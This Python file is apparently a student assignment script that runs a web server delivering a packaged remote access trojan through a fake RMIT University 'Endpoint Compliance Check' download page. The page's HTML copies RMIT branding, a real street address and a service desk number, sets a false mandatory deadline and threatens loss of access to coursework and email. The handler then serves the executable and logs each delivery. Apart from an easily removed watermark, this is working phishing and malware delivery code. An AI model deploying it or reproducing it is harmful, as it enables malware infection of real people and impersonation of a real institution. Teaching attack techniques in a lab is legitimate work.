"""
Delivery Server - Serves the packaged RAT via a fake download page
MITRE ATT&CK: T1189  (Drive-by Compromise concept)
               T1608.001 (Stage Capabilities: Upload Malware)
EDUCATIONAL PURPOSE ONLY - RMIT Cybersecurity Assignment

Runs a simple HTTP server on this machine that serves a download page.
The victim (your other laptop) visits the link and downloads the .exe.

Usage:
    1. First build the .exe:  py build_payload.py
    2. Then start delivery:   py delivery_server.py
    3. On victim machine, open: http://<this_machine_ip>:8080

The page mimics a legitimate software download site.
"""

from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
import sys
import socket

DELIVERY_PORT = 8080
SOURCE_DIR = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_DIR = os.path.join(SOURCE_DIR, "dist")
PAYLOAD_NAME = "RMIT_Security_Check.exe"

LANDING_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RMIT IT Security - Endpoint Compliance Check</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #f0f2f5;
            color: #333;
        }
        .header {
            background: #e31837;
            color: white;
            padding: 15px 40px;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .header h1 { font-size: 20px; font-weight: 600; }
        .header .subtitle { font-size: 13px; opacity: 0.9; }
        .banner {
            background: #1a1a2e;
            color: #ffd700;
            text-align: center;
            padding: 8px;
            font-size: 13px;
        }
        .container {
            max-width: 700px;
            margin: 40px auto;
            background: white;
            border-radius: 12px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
            overflow: hidden;
        }
        .content { padding: 40px; }
        .content h2 {
            font-size: 22px;
            color: #1a1a2e;
            margin-bottom: 10px;
        }
        .content p {
            color: #555;
            line-height: 1.6;
            margin-bottom: 20px;
        }
        .alert-box {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 8px;
            padding: 15px 20px;
            margin-bottom: 25px;
            font-size: 14px;
        }
        .alert-box strong { color: #856404; }
        .features {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-bottom: 30px;
        }
        .feature {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 12px 15px;
            font-size: 14px;
        }
        .feature .icon { margin-right: 8px; }
        .download-btn {
            display: block;
            width: 100%;
            padding: 16px;
            background: #28a745;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            transition: background 0.2s;
        }
        .download-btn:hover { background: #218838; }
        .meta {
            text-align: center;
            margin-top: 15px;
            font-size: 12px;
            color: #999;
        }
        .footer {
            background: #f8f9fa;
            padding: 20px 40px;
            font-size: 12px;
            color: #999;
            border-top: 1px solid #eee;
        }
        /* EDUCATIONAL WATERMARK */
        .edu-watermark {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #ff0040;
            color: white;
            text-align: center;
            padding: 10px;
            font-size: 14px;
            font-weight: bold;
            z-index: 9999;
        }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>RMIT University - IT Services</h1>
            <div class="subtitle">Information Technology Security Division</div>
        </div>
    </div>

    <div class="banner">
        ACTION REQUIRED: All students must run the Endpoint Compliance Check by August 15, 2026
    </div>

    <div class="container">
        <div class="content">
            <h2>Endpoint Security Compliance Tool</h2>
            <p>
                As part of RMIT's updated cybersecurity policy, all university devices must
                pass an endpoint compliance check. This tool scans your system for security
                vulnerabilities and ensures your device meets university security standards.
            </p>

            <div class="alert-box">
                <strong>Important:</strong> This check is mandatory for continued access
                to RMIT network services including Canvas, email, and library resources.
                Deadline: August 15, 2026.
            </div>

            <div class="features">
                <div class="feature"><span class="icon">&#128274;</span> Antivirus status check</div>
                <div class="feature"><span class="icon">&#128295;</span> Windows Update compliance</div>
                <div class="feature"><span class="icon">&#128272;</span> Firewall configuration</div>
                <div class="feature"><span class="icon">&#9989;</span> Browser security settings</div>
            </div>

            <a href="/download" class="download-btn">
                Download Security Check Tool (2.1 MB)
            </a>

            <div class="meta">
                Version 3.2.1 | Windows 10/11 | Digitally verified by RMIT IT
            </div>
        </div>

        <div class="footer">
            RMIT University | 124 La Trobe Street, Melbourne VIC 3000 |
            IT Service Desk: +61 3 9925 8888 | its@rmit.edu.au
        </div>
    </div>

    <div class="edu-watermark">
        EDUCATIONAL DEMO - RMIT CYBERSECURITY ASSIGNMENT - THIS IS A SIMULATED PHISHING PAGE
    </div>
</body>
</html>
"""


class DeliveryHandler(SimpleHTTPRequestHandler):
    """Custom handler that serves the landing page and payload."""

    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            # Serve the fake download page
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(LANDING_PAGE.encode())

        elif self.path == "/download":
            # Serve the .exe payload
            payload_path = os.path.join(PAYLOAD_DIR, PAYLOAD_NAME)
            if os.path.exists(payload_path):
                file_size = os.path.getsize(payload_path)
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Disposition", f'attachment; filename="{PAYLOAD_NAME}"')
                self.send_header("Content-Length", str(file_size))
                self.end_headers()
                with open(payload_path, "rb") as f:
                    self.wfile.write(f.read())
                print(f"[+] PAYLOAD DELIVERED to {self.client_address[0]}")
            else:
                self.send_response(404)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(b"<h1>Build the payload first: py build_payload.py</h1>")

        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        """Custom logging."""
        print(f"[*] {self.client_address[0]} - {args[0]}")


def get_local_ip():
    """Get this machine's LAN IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


if __name__ == "__main__":
    local_ip = get_local_ip()

    print("=" * 55)
    print("  DELIVERY SERVER - EDUCATIONAL PURPOSE ONLY")
    print("=" * 55)

    # Check if payload exists
    payload_path = os.path.join(PAYLOAD_DIR, PAYLOAD_NAME)
    if os.path.exists(payload_path):
        size_mb = os.path.getsize(payload_path) / (1024 * 1024)
        print(f"[+] Payload ready: {PAYLOAD_NAME} ({size_mb:.1f} MB)")
    else:
        print(f"[!] Payload not built yet!")
        print(f"[!] Run: py build_payload.py")
        print(f"[!] Starting server anyway (download will show error)...\n")

    print(f"\n[*] Delivery server starting on port {DELIVERY_PORT}")
    print(f"[*] Landing page URL:")
    print(f"\n    http://{local_ip}:{DELIVERY_PORT}")
    print(f"\n[*] Send this link to your other laptop")
    print(f"[*] The page looks like an RMIT IT security tool download")
    print(f"[*] Press Ctrl+C to stop\n")

    server = HTTPServer(("0.0.0.0", DELIVERY_PORT), DeliveryHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Delivery server stopped")
        server.server_close()
